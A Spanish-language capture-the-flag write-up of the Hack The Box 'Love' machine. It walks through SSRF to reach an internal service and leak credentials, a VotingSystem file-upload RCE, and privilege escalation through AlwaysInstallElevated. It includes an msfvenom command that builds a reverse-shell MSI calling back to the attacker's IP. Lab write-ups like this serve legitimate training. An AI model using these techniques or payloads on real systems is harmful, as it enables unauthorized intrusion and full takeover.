---
title: "Love - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://raw.githubusercontent.com/Wiinsad/Wiinsad.github.io/master/assets/images/machines/HTB/Love/data/love.png"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  - Ssrf
  - RCE
  - Key Registry Abuse
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/Wiinsad.github.io/master/assets/images/machines/HTB/Love/data/loveHTB.png">
</p>

La máquina **love** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **EASY** una calificación en el rank de 4.4, **9403 USER OWNS** y **8307 SYSTEM OWNS** con la ip **10.10.10.239** y un sistema operativo **Windows**.

## Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.239]** utilizando los parámetros:
- **-p-:**    Escaneo a toda la gama de puertos (65536).
- **-n:**     No hacen la resolución del DNS.
- **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
- **--open:** Muestra sólo los puertos con un estatus abierto.
- **-oG:**    Guarda la el output en formato Grepeable.


  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/scanPort.png">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPorts**, vemos que los puertos que destacaron en este caso fueron **80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/Ports.png">
  </p>


  Ya identificados los puertos abiertos realizare un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/PortServ.png">
  </p>

  Con este escaneo a versiones y servicio no pude sacar demasiada información así que empezare a enumerar manualmente los puertos, como veo que existe el puerto **80** entrare vía web para ver el contenido de la pagina.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/web.png">
  </p>

Al entrar se puede observar que existe un panel de login pero al no conocer las credenciales no puedo hacer gran cosa y ya que las cuentas por defecto no funciona como **"admin:admin, admin:'null',administrator:administrator, etc."** lo que haré sera con la herramienta de **openssl** conectarme al puerto 443 para ver si me brinda alguna información útil.


  Para hacer esto use el siguiente comando:

```bash
openssl s_client -connect 10.10.10.239:443
```

  Al hacer esto puedo ver que entre la información que me otorga se puede ver que existe un dominio **love.htb** y un subdominio **staging.love.htb**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/sub.png">
  </p>

  Estos dominios los agregare a la ruta de **/etc/hosts**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/hosts.png">
  </p>

  Ya implementado en mi **hosts** puedo ver que entrando a estos dominios por web específicamente a **staging.love.htb** puedo ver algo diferente a la web que anteriormente me mostró el puerto **80**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/web1.png">
  </p>

## Lateral Movement
  Examinando la pagina entrando a la pestaña de demo puedo ver que hay un panel en la seccion de **Demo** el cual me pide una **url**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/web2.png">
  </p>

 Haciendo pruebas en la web puedo ver que es vulnerable a una ataque **SSRF** ya que si ingreso la url de **http://localhost** me interpreta el contenido y me muestra el mismo panel de login que cuando accedía a la web por el puerto 80.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/web3.png">
 </p>


 Sabiendo esto y recordando los puertos que estaban disponibles ingrese el puerto 5000 el cual desde mi navegador no es posible acceder pero en el escaneo estaba el puerto abierto asi que ingresandolo como **localhost** en la web si es posible.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/web4.png">
 </p>

 Como se puede ver el contenido que me da son unas credenciales que son para el usuario **admin** pero ingresando estas credenciales en el login de la web del puerto **80** no es posible acceder pero haciendo **fuzzing** en la web puedo encontrar un subdirectorio **admin**.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/fuzz.png">
 </p>

 Entrando a la url **http://love.htb/admin** puedo ver que existe un login similar y si ingreso las credenciales accedo al panel de administrador del gestor **VotingSystem**.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/scan/web5.png">
 </p>

 Buscando en la herramienta de **searchsploit** existe un exploit el cual es un **File Upload RCE** y leyendo el exploit lo que hace es subir un archivo php el cual tengan contenido malicioso que me otorga una shell a la maquina y baypasea una mala sanitizacion de código que verifica en la cabecera si el archivo que se sube es una imagen.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/exp.png">
 </p>


 Para poder usar este exploit se tienen que setear los datos del payload como **Ip, Username, Password, Ip Destino, Port Destino** y también se tiene que modificar las url que ya están seteadas y adaptarlas a las que maneja la web eliminando el **/votesystem/** de las mismas.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/pay.png">
 </p>

 <div align="center">
 <table class="center"><tr>
 <td><center><img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/b.png">
 <div class="caption" >Url Predeterminadas.</div></center></td>
 <td><center><img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/a.png">
 <div class="caption">Url Adaptadas.</div></center></td>
 </tr></table>
 </div>

 Ya modificado y adaptado el exploit haciendo uso de la herramienta de netcat para ponerme en escucha por el puerto **443** y en paralelo ejecutando el exploit veo que el exploit funciona correctamente y me otorga la **shell**.

 <p align="center">
 <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/shell.png">
 </p>

## Privilege escalation


Como se puede ver accedo como el usuario **phoebe** y ya puedo visualizar la flag de **user.txt**.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/flag.png">
</p>

Ahora que estoy dentro de la maquina toca escalar privilegios para esto iré a la ruta **C:\Users\Phoebe\AppData\Local\Temp** y con el comando **mkdir winsad** crear una carpeta donde pueda introducir la herramienta necesaria.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/temp.png">
</p>

En esta ocasión haré uso de la herramienta **winpeas** la cual sirve para enumerar un sistema Windows mostrando datos que recolecta de una scaner que hace el sistema.


Para esto me descargare el [winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) y compartiendo un recurso compartido por **smb** con impacket copiare en winpeas al equipo victima.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/winp.png">
</p>


Una vez que el binario esta en el equipo victima procedo a ejecutarlo y esperar los resultados.

En los resultados que mostró se puede ver que existen 2 llaves de registro habilitadas las cuales se pueden abusar para escalar privilegios con la ejecución de un binario **.msi** malicioso.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/elev.png">
</p>


Una vez visto esto voy a mi consola y con **msfvenom** me creo un binario msi el cual al ser ejecutado me entable una shell a mi equipo por el puerto 443.


```bash

msfvenom -p windows/x64/shell/reverse_tcp LPORT=443 LHOST=10.10.15.125 -f msi -o winshell.msi

```

Una vez creado el binario de igual forma levanto un recurso compartido por **smb** y copeo el binario a la carpeta que cree en la ruta **Temp**.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/winsh.png">
</p>

Como se pude ver a la hora de ejecutar el binario que cree en la maquina victima de lado de donde estoy en escucha con **netcat** por el puerto 443 me otorga la shell como **nt authority\system**.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/Love/intrusion/root.png">
</p>

De esta forma teniendo el usuario administrador y así pudiendo visualizar la flag e **root.txt** y rooteando la maquina al **100%**.
